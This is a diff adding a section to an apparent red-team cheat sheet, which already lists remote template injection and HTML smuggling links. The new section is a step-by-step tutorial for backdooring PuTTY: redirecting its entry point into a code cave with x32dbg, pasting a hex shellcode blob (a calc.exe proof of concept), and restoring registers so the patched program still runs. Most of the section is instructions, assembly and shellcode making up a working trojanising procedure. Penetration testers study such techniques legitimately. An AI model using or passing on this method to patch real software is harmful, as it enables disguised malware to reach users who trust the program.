@@ -292,3 +292,58 @@ python3 remoteinjector.py -w http://<IP>/template.dot document.docx
 
 ## HTML Smuggling
 - https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
+
+#### Backdooring Putty.exe
+1. Download putty.exe https://www.putty.org/
+2. Start [x32dbg](https://x64dbg.com/) and click `F3`, open Putty. Go to Breakpoints and click the first one.
+3. Scroll down till you see a lot of nullbytes and copy and note down the first adress, optional: set a new breakpoint
+	- Example: code cave address: `0045C961`
+4. Go back to the first Breakpoint and copy the first lines of instructions
+```
+00454AD0 | 6A 60                    | push 60                                 |
+00454AD2 | 68 B07A4700              | push putty.477AB0                       |
+00454AD7 | E8 08210000              | call putty.456BE4                       |
+00454ADC | BF 94000000              | mov edi,94                              | edi:"LdrpInitializeProcess"
+00454AE1 | 8BC7                     | mov eax,edi                             | edi:"LdrpInitializeProcess"
+```
+5. Select the first first instruction and press `space`. (or right click and select assemble)
+6. Change the instruction to `jump 0x` and then past the cave address. Example: `jmp 0x0045C961`
+7. Placing shellcode in the nullbyte area will change the stack and pointers etc. Save all the value of the registers and flags to the stack. Set the following instructions in the first nullbytes:
+```
+pushad
+pushfd
+```
+8. Select the rest of the nullbyte area and copy the following calc32 hex shellcode, right click the nullbyte area and go to Binary --> Edit. Paste it with the curson at the first `00`
+```
+fc e8 82 00 00 00 60 89 e5 31 c0 64
+8b 50 30 8b 52 0c 8b 52 14 8b 72 28
+0f b7 4a 26 31 ff ac 3c 61 7c 02 2c
+20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52
+10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1
+51 8b 59 20 01 d3 8b 49 18 e3 3a 49
+8b 34 8b 01 d6 31 ff ac c1 cf 0d 01
+c7 38 e0 75 f6 03 7d f8 3b 7d 24 75
+e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b
+58 1c 01 d3 8b 04 8b 01 d0 89 44 24
+24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a
+8b 12 eb 8d 5d 6a 01 8d 85 b2 00 00
+00 50 68 31 8b 6f 87 ff d5 bb f0 b5
+a2 56 68 a6 95 bd 9d ff d5 3c 06 7c
+0a 80 fb e0 75 05 bb 47 13 72 6f 6a
+00 53 ff d5 63 61 6c 63 2e 65 78 65
+00
+```
+9. Save the changes with `ctrl p`, click "Select All" and "Patch File". Save it as as a different file and run it. Calc.exe will execute!
+10. But putty.exe won't run and the process will stop, even though calc.exe spawns. Set a breakpoint at every call by pressing `F2` on every line with `call`.
+11. Run though the code till calc.exe spawns and add a comment to the last `call` which spawned calc.exe. Then continue till it exits and change the last call that exited.
+12. Select a adress in the nullbyte area. For example `0045CA27`. Change the push before the last call by pressing `space` to `jmp 0x0045CA27`
+13. Restore the state of the registers and flags. Set the following instructions at the adress of `0045CA27` and below
+```
+popfd
+popad
+```
+14. Restore the first two instructions of step 5. Copy the bytes below and select the next empty nullbyte area, click "Binary" -> "Edit" and paste it.
+```
+6A 60 68 B0 7A 47 00
+```
+15. Make a jump to the next instruction from step 5. Copy the address (`00454AD7`) and change the next nullybyte to `jmp 0x00454AD7`
